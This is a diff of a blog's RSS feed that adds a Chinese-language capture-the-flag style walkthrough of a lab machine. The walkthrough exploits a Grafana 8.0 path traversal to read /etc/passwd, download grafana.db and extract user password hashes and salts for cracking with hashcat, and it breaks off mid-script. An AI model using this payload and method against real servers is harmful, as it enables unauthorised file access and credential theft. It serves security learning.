@@ -1,5 +1,180 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>嫉妒能让你前进，但也能让你陷入深渊。</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Thu, 04 Dec 2025 05:06:03 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>Cap</title><link>https://faabbi.github.io/post/Cap.html</link><description># 信息收集
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>嫉妒能让你前进，但也能让你陷入深渊。</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Thu, 04 Dec 2025 10:49:28 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>Data</title><link>https://faabbi.github.io/post/Data.html</link><description># 信息收集
+
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# nmap --min-rate 10000 -p- 10.129.16.155
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-04 18:01 CST
+Nmap scan report for 10.129.16.155 (10.129.16.155)
+Host is up (0.25s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+3000/tcp open  ppp
+
+Nmap done: 1 IP address (1 host up) scanned in 11.28 seconds
+```
+对3000端口进行，版本探测，详细服务识别
+
+```
+┌──(root㉿MJ)-[/tmp/test]
+└─# nmap -sV -sC -O -p3000 10.129.16.155
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-04 18:02 CST
+Nmap scan report for 10.129.16.155 (10.129.16.155)
+Host is up (0.19s latency).
+
+PORT     STATE SERVICE VERSION
+3000/tcp open  http    Grafana http
+|_http-trane-info: Problem with XML parsing of /evox/about
+| http-robots.txt: 1 disallowed entry
+|_/
+| http-title: Grafana
+|_Requested resource was /login
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19
+Network Distance: 2 hops
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.69 seconds
+```
+3000端口是Grafana服务，web进一步判断其版本信息，在此处可以看到8.0版本
+```bash
+
+curl http://10.129.16.155:3000/ -L | grep 8.0
+
+navTree: [{'id':'dashboards','text':'Dashboards','subTitle':'Manage dashboards and folders','icon':'apps','url':'/','sortWeight':-1900,'children':[{'id':'home','text':'Home','icon':'home-alt','url':'/','hideFromTabs':true},{'id':'divider','text':'Divider','divider':true,'hideFromTabs':true},{'id':'manage-dashboards','text':'Manage','icon':'sitemap','url':'/dashboards'},{'id':'playlists','text':'Playlists','icon':'presentation-play','url':'/playlists'}]},{'id':'alerting','text':'Alerting','subTitle':'Alert rules and notifications','icon':'bell','url':'/alerting/list','sortWeight':-1600,'children':[{'id':'alert-list','text':'Alert rules','icon':'list-ul','url':'/alerting/list'}]},{'id':'help','text':'Help','subTitle':'Grafana v8.0.0 (41f0542c1e)','icon':'question-circle','url':'#','sortWeight':-1200,'hideFromMenu':true}],
+```
+
+简单搜索可以发现这个版本的Grafana存在路径穿越漏洞，payload如下
+`/public/plugins/&lt;here&gt;/…/…/…/…/…/…/…/…/…/etc/passwd`
+`&lt;here&gt;`是占位符，需要替换为已安装的插件，随便一个即可
+常见的插件名字有
+```text
+alertlist
+cloudwatch
+dashlist
+elasticsearch
+graph
+graphite
+heatmap
+influxdb
+mysql
+opentsdb
+pluginlist
+postgres
+prometheus
+stackdriver
+table
+text
+```
+测试alertlist插件存在
+
+# Web
+这里需要加上`--path-as-is`参数，避免被浏览器结合路径处理
+```
+┌──(root㉿MJ)-[/tmp/test]
+└─# curl --path-as-is 'http://10.129.16.155:3000/public/plugins/alertlist/../../../../../../../../etc/passwd'
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
+```
+不过神奇的一点是，所有用户都没有shell环境，同时在hosts文件中我们可以看到这大概率是个docker容器
+```
+┌──(root㉿MJ)-[/tmp/test]
+└─# curl --path-as-is 'http://10.129.16.155:3000/public/plugins/alertlist/../../../../../../../../etc/hosts'
+127.0.0.1       localhost
+::1     localhost ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+172.17.0.2      e6ff5b1cbc85
+```
+
+**grafana的配置路径**
+```text
+/etc/grafana/grafana.ini         #全局配置文件
+/usr/local/etc/grafana/grafana.ini         #默认配置文件
+/var/lib/grafana/grafana.db         #数据库文件
+```
+这几个都很有价值，配置文件中可能写有密码字段，但是尝试发现密码已经被修改，这里重点关注数据库文件
+
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# curl --path-as-is 'http://10.129.16.155:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db' --output  sql.db
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 598016 100 598016   0     0 181176     0   0:00:03  0:00:03 --:--:-- 181162
+
+┌──(root㉿MJ)-[/tmp/test]
+└─# file sql.db
+sql.db: SQLite 3.x database, last written using SQLite version 3035004, file counter 357, database pages 146, cookie 0x109, schema 4, UTF-8, version-valid-for 357
+```
+sqlite文件，在user表找到密码hash
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# sqlite3 sql.db
+
+1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|0||2022-01-23 12:48:04|2022-01-23 12:48:50|0|2022-01-23 12:48:50|0
+2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|0||2022-01-23 12:49:11|2022-01-23 12:49:11|0|2012-01-23 12:49:11|0
+```
+
+Grafana的加密算法是**PBKDF2 算法**，hashcat对这种算法的破解只接受base64编码段
+
+运行脚本进行数据转化
+```python
+import base64
+import binascii
+
+# 原始数据
+users = [
+    {
+        'name': 'admin',
+        'salt': 'YObSoLj55S',
+        'hex': '7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8'
+    },
+    {
+        'name': 'boris',
+        'salt': 'LCBhdtJWjl',
+        'hex': 'dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8'
+    }
+]
+
+print('[-] 请将以下内容保存为 grafana.hash:')
+for u in users:
+    # 1. 处理 Salt: String -&gt; Base64
+    salt_b64 = base64.b64encode(u['salt'].encode()).decode().strip()
+    
+    # 2. 处理 Hash: 
+    # Grafana 哈希长度为 100 hex (50 bytes)。</description><guid isPermaLink="true">https://faabbi.github.io/post/Data.html</guid><pubDate>Thu, 04 Dec 2025 10:48:57 +0000</pubDate></item><item><title>Cap</title><link>https://faabbi.github.io/post/Cap.html</link><description># 信息收集
 
 **端口扫描**
 
